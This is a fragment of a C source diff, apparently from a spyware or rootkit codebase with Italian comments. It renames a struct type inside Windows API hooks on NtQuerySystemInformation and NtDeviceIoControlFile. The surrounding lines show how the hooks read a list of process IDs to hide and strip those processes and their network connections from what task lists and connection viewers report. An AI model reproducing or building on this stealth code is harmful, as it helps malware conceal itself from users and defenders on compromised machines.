@@ -403,7 +403,7 @@ typedef struct {
 NTQuerySystemInformationStruct NTQuerySystemInformationData;
 
 #define IF_PID_NOT_PRESENT(x,y) BOOL pid_present = FALSE; \
-	                            pid_hide_struct *p_phs = y; \
+	                            PID_HIDE *p_phs = y; \
 	                            if (p_phs) while (IS_SET_PID_HIDE_STRUCT((*p_phs))) { \
 									if (p_phs->PID == x) { \
 										pid_present = TRUE; \
@@ -420,7 +420,7 @@ static DWORD WINAPI NtQuerySystemInformationHook(SYSTEM_INFORMATION_CLASS pSyste
 	SYSTEM_PROCESS_INFORMATION *Spi;
 	SYSTEM_PROCESS_INFORMATION *PrevSpi;
 	BYTE *SPI_Offs;
-	pid_hide_struct *p_pid_hide;
+	PID_HIDE *p_pid_hide;
 
 	MARK_HOOK
 
@@ -435,7 +435,7 @@ static DWORD WINAPI NtQuerySystemInformationHook(SYSTEM_INFORMATION_CLASS pSyste
 		return ret_code;
 
 	// Legge la lista dei PID da nascondere
-	p_pid_hide = (pid_hide_struct *)pData->pHM_IpcCliRead(WR_HIDE_PID);
+	p_pid_hide = (PID_HIDE *)pData->pHM_IpcCliRead(WR_HIDE_PID);
 
 	SPI_Offs = (BYTE *)pSystemInformation;
 
@@ -576,7 +576,7 @@ DWORD __stdcall NtDeviceIoControlFileHook(DWORD ARG1,
 	int NumStr, NumBytes;
 	char szPID[8];
 	connection_hide_struct *p_connection_hide;
-	pid_hide_struct *p_pid_hide;
+	PID_HIDE *p_pid_hide;
 	BOOL to_hide_block;
 
 	MARK_HOOK
@@ -638,7 +638,7 @@ DWORD __stdcall NtDeviceIoControlFileHook(DWORD ARG1,
 
 	// Legge la lista di PID da nascondere per usarla nella scansione
 	// delle row extended o dei file handle
-	p_pid_hide = (pid_hide_struct *)pData->pHM_IpcCliRead(WR_HIDE_PID);
+	p_pid_hide = (PID_HIDE *)pData->pHM_IpcCliRead(WR_HIDE_PID);
 
 	// Parsing dell'array delle conessioni....
 	if(dwType == TCPVIEW_DEV) {
